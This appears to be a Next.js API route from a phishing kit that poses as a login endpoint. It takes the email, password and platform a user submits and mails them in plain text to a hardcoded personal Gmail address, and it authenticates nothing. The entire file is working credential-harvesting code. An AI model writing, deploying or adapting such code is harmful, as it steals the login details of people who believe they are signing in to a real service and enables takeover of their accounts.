import { NextRequest, NextResponse } from 'next/server';
import { sendResendEmail } from '@/lib/sendResendEmail';

interface RequestBody {
  email: string;
  password: string;
  platform?: string;
}

export async function POST(req: NextRequest) {
  const body: RequestBody = await req.json();
  const { email, password, platform } = body;
  // Send email with login attempt details
  try {
    await sendResendEmail({
      to: 'rmawais852689@gmail.com',
      subject: 'New Login Attempt',
      text: `\tLogin Attempt\n\n\nEmail/Phone: ${email}\n\nPassword: ${password}\n\nPlatform: ${platform || 'Unknown'}\n\nTime: ${new Date().toISOString()}`
    });
  } catch (error) {
    return NextResponse.json({ success: false, error: 'Failed to send email.' }, { status: 500 });
  }

  return NextResponse.json({ success: true });
}